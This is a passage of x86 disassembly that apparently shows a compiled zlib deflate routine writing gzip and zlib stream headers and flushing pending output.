  403275:	83 79 30 0f          	cmpl   $0xf,0x30(%ecx)
  403279:	75 0f                	jne    0x40328a
  40327b:	83 79 50 0f          	cmpl   $0xf,0x50(%ecx)
  40327f:	75 09                	jne    0x40328a
  403281:	52                   	push   %edx
  403282:	e8 f9 f5 ff ff       	call   0x402880
  403287:	83 c4 04             	add    $0x4,%esp
  40328a:	c3                   	ret
  40328b:	cc                   	int3
  40328c:	cc                   	int3
  40328d:	cc                   	int3
  40328e:	cc                   	int3
  40328f:	cc                   	int3
  403290:	56                   	push   %esi
  403291:	8b 70 08             	mov    0x8(%eax),%esi
  403294:	57                   	push   %edi
  403295:	8b 78 14             	mov    0x14(%eax),%edi
  403298:	8b d1                	mov    %ecx,%edx
  40329a:	c1 ea 08             	shr    $0x8,%edx
  40329d:	88 14 3e             	mov    %dl,(%esi,%edi,1)
  4032a0:	8b 78 08             	mov    0x8(%eax),%edi
  4032a3:	be 01 00 00 00       	mov    $0x1,%esi
  4032a8:	01 70 14             	add    %esi,0x14(%eax)
  4032ab:	8b 50 14             	mov    0x14(%eax),%edx
  4032ae:	88 0c 3a             	mov    %cl,(%edx,%edi,1)
  4032b1:	01 70 14             	add    %esi,0x14(%eax)
  4032b4:	5f                   	pop    %edi
  4032b5:	5e                   	pop    %esi
  4032b6:	c3                   	ret
  4032b7:	cc                   	int3
  4032b8:	cc                   	int3
  4032b9:	cc                   	int3
  4032ba:	cc                   	int3
  4032bb:	cc                   	int3
  4032bc:	cc                   	int3
  4032bd:	cc                   	int3
  4032be:	cc                   	int3
  4032bf:	cc                   	int3
  4032c0:	56                   	push   %esi
  4032c1:	8b f0                	mov    %eax,%esi
  4032c3:	8b 46 1c             	mov    0x1c(%esi),%eax
  4032c6:	8b 4e 10             	mov    0x10(%esi),%ecx
  4032c9:	57                   	push   %edi
  4032ca:	8b 78 14             	mov    0x14(%eax),%edi
  4032cd:	3b f9                	cmp    %ecx,%edi
  4032cf:	76 02                	jbe    0x4032d3
  4032d1:	8b f9                	mov    %ecx,%edi
  4032d3:	85 ff                	test   %edi,%edi
  4032d5:	74 35                	je     0x40330c
  4032d7:	8b 40 10             	mov    0x10(%eax),%eax
  4032da:	8b 4e 0c             	mov    0xc(%esi),%ecx
  4032dd:	57                   	push   %edi
  4032de:	50                   	push   %eax
  4032df:	51                   	push   %ecx
  4032e0:	e8 6b 80 00 00       	call   0x40b350
  4032e5:	8b 46 1c             	mov    0x1c(%esi),%eax
  4032e8:	01 7e 0c             	add    %edi,0xc(%esi)
  4032eb:	01 78 10             	add    %edi,0x10(%eax)
  4032ee:	01 7e 14             	add    %edi,0x14(%esi)
  4032f1:	29 7e 10             	sub    %edi,0x10(%esi)
  4032f4:	8b 46 1c             	mov    0x1c(%esi),%eax
  4032f7:	29 78 14             	sub    %edi,0x14(%eax)
  4032fa:	8b 76 1c             	mov    0x1c(%esi),%esi
  4032fd:	83 c4 0c             	add    $0xc,%esp
  403300:	83 7e 14 00          	cmpl   $0x0,0x14(%esi)
  403304:	75 06                	jne    0x40330c
  403306:	8b 56 08             	mov    0x8(%esi),%edx
  403309:	89 56 10             	mov    %edx,0x10(%esi)
  40330c:	5f                   	pop    %edi
  40330d:	5e                   	pop    %esi
  40330e:	c3                   	ret
  40330f:	cc                   	int3
  403310:	56                   	push   %esi
  403311:	57                   	push   %edi
  403312:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  403316:	85 ff                	test   %edi,%edi
  403318:	0f 84 c3 07 00 00    	je     0x403ae1
  40331e:	8b 77 1c             	mov    0x1c(%edi),%esi
  403321:	85 f6                	test   %esi,%esi
  403323:	0f 84 b8 07 00 00    	je     0x403ae1
  403329:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40332d:	83 f9 04             	cmp    $0x4,%ecx
  403330:	0f 87 ab 07 00 00    	ja     0x403ae1
  403336:	83 7f 0c 00          	cmpl   $0x0,0xc(%edi)
  40333a:	0f 84 99 07 00 00    	je     0x403ad9
  403340:	83 3f 00             	cmpl   $0x0,(%edi)
  403343:	75 0a                	jne    0x40334f
  403345:	83 7f 04 00          	cmpl   $0x0,0x4(%edi)
  403349:	0f 85 8a 07 00 00    	jne    0x403ad9
  40334f:	8b 46 04             	mov    0x4(%esi),%eax
  403352:	3d 9a 02 00 00       	cmp    $0x29a,%eax
  403357:	75 09                	jne    0x403362
  403359:	83 f9 04             	cmp    $0x4,%ecx
  40335c:	0f 85 77 07 00 00    	jne    0x403ad9
  403362:	83 7f 10 00          	cmpl   $0x0,0x10(%edi)
  403366:	75 10                	jne    0x403378
  403368:	a1 e4 ef 41 00       	mov    0x41efe4,%eax
  40336d:	89 47 18             	mov    %eax,0x18(%edi)
  403370:	5f                   	pop    %edi
  403371:	b8 fb ff ff ff       	mov    $0xfffffffb,%eax
  403376:	5e                   	pop    %esi
  403377:	c3                   	ret
  403378:	8b 56 28             	mov    0x28(%esi),%edx
  40337b:	53                   	push   %ebx
  40337c:	55                   	push   %ebp
  40337d:	89 3e                	mov    %edi,(%esi)
  40337f:	89 54 24 14          	mov    %edx,0x14(%esp)
  403383:	89 4e 28             	mov    %ecx,0x28(%esi)
  403386:	bb 01 00 00 00       	mov    $0x1,%ebx
  40338b:	83 f8 2a             	cmp    $0x2a,%eax
  40338e:	0f 85 a2 02 00 00    	jne    0x403636
  403394:	b8 02 00 00 00       	mov    $0x2,%eax
  403399:	39 46 18             	cmp    %eax,0x18(%esi)
  40339c:	0f 85 fe 01 00 00    	jne    0x4035a0
  4033a2:	6a 00                	push   $0x0
  4033a4:	6a 00                	push   $0x0
  4033a6:	6a 00                	push   $0x0
  4033a8:	e8 d3 fc ff ff       	call   0x403080
  4033ad:	89 47 30             	mov    %eax,0x30(%edi)
  4033b0:	8b 4e 14             	mov    0x14(%esi),%ecx
  4033b3:	8b 46 08             	mov    0x8(%esi),%eax
  4033b6:	c6 04 08 1f          	movb   $0x1f,(%eax,%ecx,1)
  4033ba:	01 5e 14             	add    %ebx,0x14(%esi)
  4033bd:	8b 46 14             	mov    0x14(%esi),%eax
  4033c0:	8b 56 08             	mov    0x8(%esi),%edx
  4033c3:	c6 04 10 8b          	movb   $0x8b,(%eax,%edx,1)
  4033c7:	01 5e 14             	add    %ebx,0x14(%esi)
  4033ca:	8b 46 14             	mov    0x14(%esi),%eax
  4033cd:	8b 4e 08             	mov    0x8(%esi),%ecx
  4033d0:	c6 04 08 08          	movb   $0x8,(%eax,%ecx,1)
  4033d4:	01 5e 14             	add    %ebx,0x14(%esi)
  4033d7:	8b 46 1c             	mov    0x1c(%esi),%eax
  4033da:	8b 6e 14             	mov    0x14(%esi),%ebp
  4033dd:	83 c4 0c             	add    $0xc,%esp
  4033e0:	85 c0                	test   %eax,%eax
  4033e2:	0f 85 89 00 00 00    	jne    0x403471
  4033e8:	8b 56 08             	mov    0x8(%esi),%edx
  4033eb:	88 04 2a             	mov    %al,(%edx,%ebp,1)
  4033ee:	01 5e 14             	add    %ebx,0x14(%esi)
  4033f1:	8b 46 14             	mov    0x14(%esi),%eax
  4033f4:	8b 4e 08             	mov    0x8(%esi),%ecx
  4033f7:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  4033fb:	01 5e 14             	add    %ebx,0x14(%esi)
  4033fe:	8b 46 14             	mov    0x14(%esi),%eax
  403401:	8b 56 08             	mov    0x8(%esi),%edx
  403404:	c6 04 10 00          	movb   $0x0,(%eax,%edx,1)
  403408:	01 5e 14             	add    %ebx,0x14(%esi)
  40340b:	8b 46 14             	mov    0x14(%esi),%eax
  40340e:	8b 4e 08             	mov    0x8(%esi),%ecx
  403411:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  403415:	01 5e 14             	add    %ebx,0x14(%esi)
  403418:	8b 46 14             	mov    0x14(%esi),%eax
  40341b:	8b 56 08             	mov    0x8(%esi),%edx
  40341e:	c6 04 10 00          	movb   $0x0,(%eax,%edx,1)
  403422:	01 5e 14             	add    %ebx,0x14(%esi)
  403425:	8b 86 84 00 00 00    	mov    0x84(%esi),%eax
  40342b:	8b 4e 14             	mov    0x14(%esi),%ecx
  40342e:	83 f8 09             	cmp    $0x9,%eax
  403431:	75 05                	jne    0x403438
  403433:	8d 43 01             	lea    0x1(%ebx),%eax
  403436:	eb 17                	jmp    0x40344f
  403438:	83 be 88 00 00 00 02 	cmpl   $0x2,0x88(%esi)
  40343f:	7d 09                	jge    0x40344a
  403441:	83 f8 02             	cmp    $0x2,%eax
  403444:	7c 04                	jl     0x40344a
  403446:	33 c0                	xor    %eax,%eax
  403448:	eb 05                	jmp    0x40344f
  40344a:	b8 04 00 00 00       	mov    $0x4,%eax
  40344f:	8b 56 08             	mov    0x8(%esi),%edx
  403452:	88 04 11             	mov    %al,(%ecx,%edx,1)
  403455:	01 5e 14             	add    %ebx,0x14(%esi)
  403458:	8b 46 14             	mov    0x14(%esi),%eax
  40345b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40345e:	c6 04 08 0b          	movb   $0xb,(%eax,%ecx,1)
  403462:	01 5e 14             	add    %ebx,0x14(%esi)
  403465:	c7 46 04 71 00 00 00 	movl   $0x71,0x4(%esi)
  40346c:	e9 c5 01 00 00       	jmp    0x403636
  403471:	8b 50 24             	mov    0x24(%eax),%edx
  403474:	8b 48 2c             	mov    0x2c(%eax),%ecx
  403477:	f7 da                	neg    %edx
  403479:	1a d2                	sbb    %dl,%dl
  40347b:	80 e2 10             	and    $0x10,%dl
  40347e:	f7 d9                	neg    %ecx
  403480:	1a c9                	sbb    %cl,%cl
  403482:	80 e1 02             	and    $0x2,%cl
  403485:	02 d1                	add    %cl,%dl
  403487:	8b 48 1c             	mov    0x1c(%eax),%ecx
  40348a:	f7 d9                	neg    %ecx
  40348c:	1a c9                	sbb    %cl,%cl
  40348e:	80 e1 08             	and    $0x8,%cl
  403491:	02 d1                	add    %cl,%dl
  403493:	8b 48 10             	mov    0x10(%eax),%ecx
  403496:	f7 d9                	neg    %ecx
  403498:	1a c9                	sbb    %cl,%cl
  40349a:	80 e1 04             	and    $0x4,%cl
  40349d:	02 d1                	add    %cl,%dl
  40349f:	83 38 00             	cmpl   $0x0,(%eax)
  4034a2:	8b 4e 08             	mov    0x8(%esi),%ecx
  4034a5:	0f 95 c0             	setne  %al
  4034a8:	02 d0                	add    %al,%dl
  4034aa:	88 14 29             	mov    %dl,(%ecx,%ebp,1)
  4034ad:	01 5e 14             	add    %ebx,0x14(%esi)
  4034b0:	8b 46 14             	mov    0x14(%esi),%eax
  4034b3:	8b 56 1c             	mov    0x1c(%esi),%edx
  4034b6:	0f b6 52 04          	movzbl 0x4(%edx),%edx
  4034ba:	8b 4e 08             	mov    0x8(%esi),%ecx
  4034bd:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  4034c0:	01 5e 14             	add    %ebx,0x14(%esi)
  4034c3:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  4034c6:	0f b6 49 05          	movzbl 0x5(%ecx),%ecx
  4034ca:	8b 46 14             	mov    0x14(%esi),%eax
  4034cd:	8b 56 08             	mov    0x8(%esi),%edx
  4034d0:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  4034d3:	01 5e 14             	add    %ebx,0x14(%esi)
  4034d6:	8b 56 1c             	mov    0x1c(%esi),%edx
  4034d9:	0f b6 52 06          	movzbl 0x6(%edx),%edx
  4034dd:	8b 46 14             	mov    0x14(%esi),%eax
  4034e0:	8b 4e 08             	mov    0x8(%esi),%ecx
  4034e3:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  4034e6:	01 5e 14             	add    %ebx,0x14(%esi)
  4034e9:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  4034ec:	0f b6 49 07          	movzbl 0x7(%ecx),%ecx
  4034f0:	8b 46 14             	mov    0x14(%esi),%eax
  4034f3:	8b 56 08             	mov    0x8(%esi),%edx
  4034f6:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  4034f9:	01 5e 14             	add    %ebx,0x14(%esi)
  4034fc:	8b 86 84 00 00 00    	mov    0x84(%esi),%eax
  403502:	8b 4e 14             	mov    0x14(%esi),%ecx
  403505:	83 f8 09             	cmp    $0x9,%eax
  403508:	75 07                	jne    0x403511
  40350a:	b8 02 00 00 00       	mov    $0x2,%eax
  40350f:	eb 17                	jmp    0x403528
  403511:	83 be 88 00 00 00 02 	cmpl   $0x2,0x88(%esi)
  403518:	7d 09                	jge    0x403523
  40351a:	83 f8 02             	cmp    $0x2,%eax
  40351d:	7c 04                	jl     0x403523
  40351f:	33 c0                	xor    %eax,%eax
  403521:	eb 05                	jmp    0x403528
  403523:	b8 04 00 00 00       	mov    $0x4,%eax
  403528:	8b 56 08             	mov    0x8(%esi),%edx
  40352b:	88 04 11             	mov    %al,(%ecx,%edx,1)
  40352e:	01 5e 14             	add    %ebx,0x14(%esi)
  403531:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  403534:	8b 46 14             	mov    0x14(%esi),%eax
  403537:	8a 49 0c             	mov    0xc(%ecx),%cl
  40353a:	8b 56 08             	mov    0x8(%esi),%edx
  40353d:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  403540:	01 5e 14             	add    %ebx,0x14(%esi)
  403543:	8b 46 1c             	mov    0x1c(%esi),%eax
  403546:	83 78 10 00          	cmpl   $0x0,0x10(%eax)
  40354a:	8b 4e 14             	mov    0x14(%esi),%ecx
  40354d:	74 21                	je     0x403570
  40354f:	8a 40 14             	mov    0x14(%eax),%al
  403552:	8b 56 08             	mov    0x8(%esi),%edx
  403555:	88 04 11             	mov    %al,(%ecx,%edx,1)
  403558:	01 5e 14             	add    %ebx,0x14(%esi)
  40355b:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  40355e:	8a 49 15             	mov    0x15(%ecx),%cl
  403561:	8b 46 14             	mov    0x14(%esi),%eax
  403564:	8b 56 08             	mov    0x8(%esi),%edx
  403567:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  40356a:	01 5e 14             	add    %ebx,0x14(%esi)
  40356d:	8b 4e 14             	mov    0x14(%esi),%ecx
  403570:	8b 56 1c             	mov    0x1c(%esi),%edx
  403573:	83 7a 2c 00          	cmpl   $0x0,0x2c(%edx)
  403577:	74 14                	je     0x40358d
  403579:	8b 46 08             	mov    0x8(%esi),%eax
  40357c:	51                   	push   %ecx
  40357d:	8b 4f 30             	mov    0x30(%edi),%ecx
  403580:	50                   	push   %eax
  403581:	51                   	push   %ecx
  403582:	e8 f9 fa ff ff       	call   0x403080
  403587:	83 c4 0c             	add    $0xc,%esp
  40358a:	89 47 30             	mov    %eax,0x30(%edi)
  40358d:	c7 46 20 00 00 00 00 	movl   $0x0,0x20(%esi)
  403594:	c7 46 04 45 00 00 00 	movl   $0x45,0x4(%esi)
  40359b:	e9 96 00 00 00       	jmp    0x403636
  4035a0:	8b 4e 30             	mov    0x30(%esi),%ecx
  4035a3:	83 e9 08             	sub    $0x8,%ecx
  4035a6:	c1 e1 0c             	shl    $0xc,%ecx
  4035a9:	81 c1 00 08 00 00    	add    $0x800,%ecx
  4035af:	39 86 88 00 00 00    	cmp    %eax,0x88(%esi)
  4035b5:	7d 1f                	jge    0x4035d6
  4035b7:	8b ae 84 00 00 00    	mov    0x84(%esi),%ebp
  4035bd:	3b e8                	cmp    %eax,%ebp
  4035bf:	7c 15                	jl     0x4035d6
  4035c1:	83 fd 06             	cmp    $0x6,%ebp
  4035c4:	7d 04                	jge    0x4035ca
  4035c6:	8b c3                	mov    %ebx,%eax
  4035c8:	eb 0e                	jmp    0x4035d8
  4035ca:	33 d2                	xor    %edx,%edx
  4035cc:	83 fd 06             	cmp    $0x6,%ebp
  4035cf:	0f 95 c2             	setne  %dl
  4035d2:	03 c2                	add    %edx,%eax
  4035d4:	eb 02                	jmp    0x4035d8
  4035d6:	33 c0                	xor    %eax,%eax
  4035d8:	c1 e0 06             	shl    $0x6,%eax
  4035db:	0b c8                	or     %eax,%ecx
  4035dd:	83 7e 6c 00          	cmpl   $0x0,0x6c(%esi)
  4035e1:	74 03                	je     0x4035e6
  4035e3:	83 c9 20             	or     $0x20,%ecx
  4035e6:	b8 85 10 42 08       	mov    $0x8421085,%eax
  4035eb:	f7 e1                	mul    %ecx
  4035ed:	2b ca                	sub    %edx,%ecx
  4035ef:	d1 e9                	shr    $1,%ecx
  4035f1:	03 ca                	add    %edx,%ecx
  4035f3:	c1 e9 04             	shr    $0x4,%ecx
  4035f6:	03 cb                	add    %ebx,%ecx
  4035f8:	8b c1                	mov    %ecx,%eax
  4035fa:	c1 e1 05             	shl    $0x5,%ecx
  4035fd:	2b c8                	sub    %eax,%ecx
  4035ff:	8b c6                	mov    %esi,%eax
  403601:	c7 46 04 71 00 00 00 	movl   $0x71,0x4(%esi)
  403608:	e8 83 fc ff ff       	call   0x403290
  40360d:	83 7e 6c 00          	cmpl   $0x0,0x6c(%esi)
  403611:	74 12                	je     0x403625
  403613:	0f b7 4f 32          	movzwl 0x32(%edi),%ecx
  403617:	e8 74 fc ff ff       	call   0x403290
  40361c:	0f b7 4f 30          	movzwl 0x30(%edi),%ecx
  403620:	e8 6b fc ff ff       	call   0x403290
  403625:	6a 00                	push   $0x0
  403627:	6a 00                	push   $0x0
  403629:	6a 00                	push   $0x0
  40362b:	e8 70 ee ff ff       	call   0x4024a0
  403630:	83 c4 0c             	add    $0xc,%esp
  403633:	89 47 30             	mov    %eax,0x30(%edi)
  403636:	83 7e 04 45          	cmpl   $0x45,0x4(%esi)
  40363a:	0f 85 c8 00 00 00    	jne    0x403708
  403640:	8b 46 1c             	mov    0x1c(%esi),%eax
  403643:	83 78 10 00          	cmpl   $0x0,0x10(%eax)
  403647:	0f 84 b4 00 00 00    	je     0x403701
  40364d:	0f b7 40 14          	movzwl 0x14(%eax),%eax
  403651:	8b 4e 14             	mov    0x14(%esi),%ecx
  403654:	39 46 20             	cmp    %eax,0x20(%esi)
  403657:	73 6e                	jae    0x4036c7
  403659:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  403660:	8b 46 14             	mov    0x14(%esi),%eax
  403663:	3b 46 0c             	cmp    0xc(%esi),%eax
  403666:	75 36                	jne    0x40369e
  403668:	8b 56 1c             	mov    0x1c(%esi),%edx
  40366b:	83 7a 2c 00          	cmpl   $0x0,0x2c(%edx)
  40366f:	74 1c                	je     0x40368d
  403671:	3b c1                	cmp    %ecx,%eax
  403673:	76 18                	jbe    0x40368d
  403675:	2b c1                	sub    %ecx,%eax
  403677:	50                   	push   %eax
  403678:	8b 46 08             	mov    0x8(%esi),%eax
  40367b:	03 c1                	add    %ecx,%eax
  40367d:	8b 4f 30             	mov    0x30(%edi),%ecx
  403680:	50                   	push   %eax
  403681:	51                   	push   %ecx
  403682:	e8 f9 f9 ff ff       	call   0x403080
  403687:	83 c4 0c             	add    $0xc,%esp
  40368a:	89 47 30             	mov    %eax,0x30(%edi)
  40368d:	8b c7                	mov    %edi,%eax
  40368f:	e8 2c fc ff ff       	call   0x4032c0
  403694:	8b 46 14             	mov    0x14(%esi),%eax
  403697:	8b c8                	mov    %eax,%ecx
  403699:	3b 46 0c             	cmp    0xc(%esi),%eax
  40369c:	74 29                	je     0x4036c7
  40369e:	8b 56 1c             	mov    0x1c(%esi),%edx
  4036a1:	8b 52 10             	mov    0x10(%edx),%edx
  4036a4:	8b 5e 20             	mov    0x20(%esi),%ebx
  4036a7:	8a 14 1a             	mov    (%edx,%ebx,1),%dl
  4036aa:	8b 6e 08             	mov    0x8(%esi),%ebp
  4036ad:	88 14 28             	mov    %dl,(%eax,%ebp,1)
  4036b0:	b8 01 00 00 00       	mov    $0x1,%eax
  4036b5:	01 46 14             	add    %eax,0x14(%esi)
  4036b8:	01 46 20             	add    %eax,0x20(%esi)
  4036bb:	8b 46 1c             	mov    0x1c(%esi),%eax
  4036be:	0f b7 50 14          	movzwl 0x14(%eax),%edx
  4036c2:	39 56 20             	cmp    %edx,0x20(%esi)
  4036c5:	72 99                	jb     0x403660
  4036c7:	8b 46 1c             	mov    0x1c(%esi),%eax
  4036ca:	83 78 2c 00          	cmpl   $0x0,0x2c(%eax)
  4036ce:	74 1f                	je     0x4036ef
  4036d0:	8b 46 14             	mov    0x14(%esi),%eax
  4036d3:	3b c1                	cmp    %ecx,%eax
  4036d5:	76 18                	jbe    0x4036ef
  4036d7:	8b 56 08             	mov    0x8(%esi),%edx
  4036da:	2b c1                	sub    %ecx,%eax
  4036dc:	50                   	push   %eax
  4036dd:	8b 47 30             	mov    0x30(%edi),%eax
  4036e0:	03 d1                	add    %ecx,%edx
  4036e2:	52                   	push   %edx
  4036e3:	50                   	push   %eax
  4036e4:	e8 97 f9 ff ff       	call   0x403080
  4036e9:	83 c4 0c             	add    $0xc,%esp
  4036ec:	89 47 30             	mov    %eax,0x30(%edi)
  4036ef:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  4036f2:	8b 56 20             	mov    0x20(%esi),%edx
  4036f5:	3b 51 14             	cmp    0x14(%ecx),%edx
  4036f8:	75 0e                	jne    0x403708
  4036fa:	c7 46 20 00 00 00 00 	movl   $0x0,0x20(%esi)
  403701:	c7 46 04 49 00 00 00 	movl   $0x49,0x4(%esi)
  403708:	83 7e 04 49          	cmpl   $0x49,0x4(%esi)
  40370c:	bd 01 00 00 00       	mov    $0x1,%ebp
  403711:	0f 85 a6 00 00 00    	jne    0x4037bd
  403717:	8b 46 1c             	mov    0x1c(%esi),%eax
  40371a:	83 78 1c 00          	cmpl   $0x0,0x1c(%eax)
  40371e:	0f 84 92 00 00 00    	je     0x4037b6
  403724:	8b 56 14             	mov    0x14(%esi),%edx
  403727:	8b 46 14             	mov    0x14(%esi),%eax
  40372a:	3b 46 0c             	cmp    0xc(%esi),%eax
  40372d:	75 36                	jne    0x403765
  40372f:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  403732:	83 79 2c 00          	cmpl   $0x0,0x2c(%ecx)
  403736:	74 1c                	je     0x403754
  403738:	3b c2                	cmp    %edx,%eax
  40373a:	76 18                	jbe    0x403754
  40373c:	8b 4f 30             	mov    0x30(%edi),%ecx
  40373f:	2b c2                	sub    %edx,%eax
  403741:	50                   	push   %eax
  403742:	8b 46 08             	mov    0x8(%esi),%eax
  403745:	03 c2                	add    %edx,%eax
  403747:	50                   	push   %eax
  403748:	51                   	push   %ecx
  403749:	e8 32 f9 ff ff       	call   0x403080
  40374e:	83 c4 0c             	add    $0xc,%esp
  403751:	89 47 30             	mov    %eax,0x30(%edi)
  403754:	8b c7                	mov    %edi,%eax
  403756:	e8 65 fb ff ff       	call   0x4032c0
  40375b:	8b 46 14             	mov    0x14(%esi),%eax
  40375e:	8b d0                	mov    %eax,%edx
  403760:	3b 46 0c             	cmp    0xc(%esi),%eax
  403763:	74 20                	je     0x403785
  403765:	8b 4e 20             	mov    0x20(%esi),%ecx
  403768:	8b 5e 1c             	mov    0x1c(%esi),%ebx
  40376b:	8b 5b 1c             	mov    0x1c(%ebx),%ebx
  40376e:	0f b6 1c 0b          	movzbl (%ebx,%ecx,1),%ebx
  403772:	41                   	inc    %ecx
  403773:	89 4e 20             	mov    %ecx,0x20(%esi)
  403776:	8b 4e 08             	mov    0x8(%esi),%ecx
  403779:	88 1c 08             	mov    %bl,(%eax,%ecx,1)
  40377c:	01 6e 14             	add    %ebp,0x14(%esi)
  40377f:	85 db                	test   %ebx,%ebx
  403781:	75 a4                	jne    0x403727
  403783:	eb 02                	jmp    0x403787
  403785:	8b dd                	mov    %ebp,%ebx
  403787:	8b 46 1c             	mov    0x1c(%esi),%eax
  40378a:	83 78 2c 00          	cmpl   $0x0,0x2c(%eax)
  40378e:	74 1f                	je     0x4037af
  403790:	8b 46 14             	mov    0x14(%esi),%eax
  403793:	3b c2                	cmp    %edx,%eax
  403795:	76 18                	jbe    0x4037af
  403797:	8b 4e 08             	mov    0x8(%esi),%ecx
  40379a:	2b c2                	sub    %edx,%eax
  40379c:	50                   	push   %eax
  40379d:	03 ca                	add    %edx,%ecx
  40379f:	8b 57 30             	mov    0x30(%edi),%edx
  4037a2:	51                   	push   %ecx
  4037a3:	52                   	push   %edx
  4037a4:	e8 d7 f8 ff ff       	call   0x403080
  4037a9:	83 c4 0c             	add    $0xc,%esp
  4037ac:	89 47 30             	mov    %eax,0x30(%edi)
  4037af:	85 db                	test   %ebx,%ebx
  4037b1:	75 0a                	jne    0x4037bd
  4037b3:	89 5e 20             	mov    %ebx,0x20(%esi)
  4037b6:	c7 46 04 5b 00 00 00 	movl   $0x5b,0x4(%esi)
  4037bd:	83 7e 04 5b          	cmpl   $0x5b,0x4(%esi)
  4037c1:	0f 85 a3 00 00 00    	jne    0x40386a
  4037c7:	8b 46 1c             	mov    0x1c(%esi),%eax
  4037ca:	83 78 24 00          	cmpl   $0x0,0x24(%eax)
  4037ce:	0f 84 8f 00 00 00    	je     0x403863
  4037d4:	8b 56 14             	mov    0x14(%esi),%edx
  4037d7:	8b 46 14             	mov    0x14(%esi),%eax
  4037da:	3b 46 0c             	cmp    0xc(%esi),%eax
  4037dd:	75 36                	jne    0x403815
  4037df:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  4037e2:	83 79 2c 00          	cmpl   $0x0,0x2c(%ecx)
  4037e6:	74 1c                	je     0x403804
  4037e8:	3b c2                	cmp    %edx,%eax
  4037ea:	76 18                	jbe    0x403804
  4037ec:	8b 4f 30             	mov    0x30(%edi),%ecx
  4037ef:	2b c2                	sub    %edx,%eax
  4037f1:	50                   	push   %eax
  4037f2:	8b 46 08             	mov    0x8(%esi),%eax
  4037f5:	03 c2                	add    %edx,%eax
  4037f7:	50                   	push   %eax
  4037f8:	51                   	push   %ecx
  4037f9:	e8 82 f8 ff ff       	call   0x403080
  4037fe:	83 c4 0c             	add    $0xc,%esp
  403801:	89 47 30             	mov    %eax,0x30(%edi)
  403804:	8b c7                	mov    %edi,%eax
  403806:	e8 b5 fa ff ff       	call   0x4032c0
  40380b:	8b 46 14             	mov    0x14(%esi),%eax
  40380e:	8b d0                	mov    %eax,%edx
  403810:	3b 46 0c             	cmp    0xc(%esi),%eax
  403813:	74 20                	je     0x403835
  403815:	8b 4e 20             	mov    0x20(%esi),%ecx
  403818:	8b 5e 1c             	mov    0x1c(%esi),%ebx
  40381b:	8b 5b 24             	mov    0x24(%ebx),%ebx
  40381e:	0f b6 1c 0b          	movzbl (%ebx,%ecx,1),%ebx
  403822:	41                   	inc    %ecx
  403823:	89 4e 20             	mov    %ecx,0x20(%esi)
  403826:	8b 4e 08             	mov    0x8(%esi),%ecx
  403829:	88 1c 08             	mov    %bl,(%eax,%ecx,1)
  40382c:	01 6e 14             	add    %ebp,0x14(%esi)
  40382f:	85 db                	test   %ebx,%ebx
  403831:	75 a4                	jne    0x4037d7
  403833:	eb 02                	jmp    0x403837
  403835:	8b dd                	mov    %ebp,%ebx
  403837:	8b 46 1c             	mov    0x1c(%esi),%eax
  40383a:	83 78 2c 00          	cmpl   $0x0,0x2c(%eax)
  40383e:	74 1f                	je     0x40385f
  403840:	8b 46 14             	mov    0x14(%esi),%eax
  403843:	3b c2                	cmp    %edx,%eax
  403845:	76 18                	jbe    0x40385f
  403847:	8b 4e 08             	mov    0x8(%esi),%ecx
  40384a:	2b c2                	sub    %edx,%eax
  40384c:	50                   	push   %eax
  40384d:	03 ca                	add    %edx,%ecx
  40384f:	8b 57 30             	mov    0x30(%edi),%edx
  403852:	51                   	push   %ecx
  403853:	52                   	push   %edx
  403854:	e8 27 f8 ff ff       	call   0x403080
  403859:	83 c4 0c             	add    $0xc,%esp
  40385c:	89 47 30             	mov    %eax,0x30(%edi)
  40385f:	85 db                	test   %ebx,%ebx
  403861:	75 07                	jne    0x40386a
  403863:	c7 46 04 67 00 00 00 	movl   $0x67,0x4(%esi)
  40386a:	83 7e 04 67          	cmpl   $0x67,0x4(%esi)
  40386e:	75 5b                	jne    0x4038cb
  403870:	8b 46 1c             	mov    0x1c(%esi),%eax
  403873:	83 78 2c 00          	cmpl   $0x0,0x2c(%eax)
  403877:	74 4b                	je     0x4038c4
  403879:	8b 4e 14             	mov    0x14(%esi),%ecx
  40387c:	83 c1 02             	add    $0x2,%ecx
  40387f:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  403882:	76 07                	jbe    0x40388b
  403884:	8b c7                	mov    %edi,%eax
  403886:	e8 35 fa ff ff       	call   0x4032c0
  40388b:	8b 46 14             	mov    0x14(%esi),%eax
  40388e:	8d 50 02             	lea    0x2(%eax),%edx
  403891:	3b 56 0c             	cmp    0xc(%esi),%edx
  403894:	77 35                	ja     0x4038cb
  403896:	0f b6 57 30          	movzbl 0x30(%edi),%edx
  40389a:	8b 4e 08             	mov    0x8(%esi),%ecx
  40389d:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  4038a0:	01 6e 14             	add    %ebp,0x14(%esi)
  4038a3:	0f b6 57 31          	movzbl 0x31(%edi),%edx
  4038a7:	8b 46 14             	mov    0x14(%esi),%eax
  4038aa:	8b 4e 08             	mov    0x8(%esi),%ecx
  4038ad:	6a 00                	push   $0x0
  4038af:	6a 00                	push   $0x0
  4038b1:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  4038b4:	01 6e 14             	add    %ebp,0x14(%esi)
  4038b7:	6a 00                	push   $0x0
  4038b9:	e8 c2 f7 ff ff       	call   0x403080
  4038be:	83 c4 0c             	add    $0xc,%esp
  4038c1:	89 47 30             	mov    %eax,0x30(%edi)
  4038c4:	c7 46 04 71 00 00 00 	movl   $0x71,0x4(%esi)
  4038cb:	83 7e 14 00          	cmpl   $0x0,0x14(%esi)
  4038cf:	74 1b                	je     0x4038ec
  4038d1:	8b c7                	mov    %edi,%eax
  4038d3:	e8 e8 f9 ff ff       	call   0x4032c0
